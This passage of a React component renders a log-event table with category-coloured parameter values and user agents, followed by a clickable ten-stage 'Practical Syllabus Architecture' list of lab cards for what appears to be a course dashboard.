                            </td>
                            <td style={{ padding: '8px 12px', fontFamily: 'monospace', color: '#94a3b8' }}>
                              {ev.paramKey}
                            </td>
                            <td style={{ padding: '8px 12px', fontFamily: 'monospace', color: ev.category === 'benign' ? '#94a3b8' : '#fca5a5' }}>
                              <span title={ev.paramVal} style={{ display: 'inline-block', maxWidth: '320px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {ev.paramVal}
                              </span>
                            </td>
                            <td style={{ padding: '8px 12px', fontFamily: 'monospace', color: '#64748b' }}>
                              <span title={ev.userAgent} style={{ display: 'inline-block', maxWidth: '150px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {ev.userAgent}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>

                  {displayedEvents.length === 0 && (
                    <div style={{ padding: '24px', textAlign: 'center', color: '#64748b', fontSize: '13px' }}>
                      No log events matched the current filter criteria.
                    </div>
                  )}

                  {displayedEvents.length > 25 && (
                    <div style={{ padding: '10px 14px', background: 'rgba(255,255,255,0.02)', borderTop: '1px solid rgba(255,255,255,0.05)', fontSize: '11.5px', color: '#64748b', textAlign: 'center' }}>
                      Showing first 25 of {displayedEvents.length} filtered records. Download CSV artifact to view complete dataset.
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>

        {/* ── 10-STAGE WORKFLOW CURRICULUM ── */}
        <div style={{ marginBottom: '18px' }}>
          <h2 style={{ fontSize: '17px', fontWeight: '800', margin: '0 0 6px', color: '#f8fafc' }}>
            Practical Syllabus Architecture
          </h2>
          <div className="callout callout-blue" style={{ marginBottom: '20px' }}>
            <GitBranch size={18} style={{ color: '#60a5fa', flexShrink: 0 }} />
            <div>Click any stage below to inspect its dedicated data processing module, formula derivations, and lab documentation.</div>
          </div>
        </div>

        <div className="pipeline-stages">
          {data.map((p, i) => {
            const color = STAGE_COLORS[(p.id - 1) % STAGE_COLORS.length]
            return (
              <div key={p.id} className="pipeline-stage" onClick={() => openPractical(p)}>
                <div className="stage-connector">
                  <div className="stage-num" style={{ background: color, boxShadow: `0 0 12px ${color}55` }}>
                    {p.id}
                  </div>
                  {i < data.length - 1 && <div className="stage-line" />}
                </div>
                <div className="stage-card">
                  <div className="stage-top">
                    <div className="stage-icon-badge" style={{ background: `${color}20`, border: `1px solid ${color}30` }}>
                      <Activity size={16} style={{ color }} />
                    </div>
                    <span className="stage-cat">{p.category}</span>
                  </div>
                  <div className="stage-title">Practical {p.id}: {p.short_title}</div>
                  <div className="stage-desc">{p.learning?.concept_summary?.slice(0, 130)}...</div>
                  <div className="stage-tags">
                    {p.tags?.slice(0, 2).map(t => <span key={t} className="tag tag-gray">{t}</span>)}
                  </div>
                  <div className="stage-output">
                    <strong>Output:</strong> {STAGE_OUTPUTS[p.id]}
                  </div>
                </div>
              </div>
            )
          })}
        </div>
      </div>
    </section>
  )
}
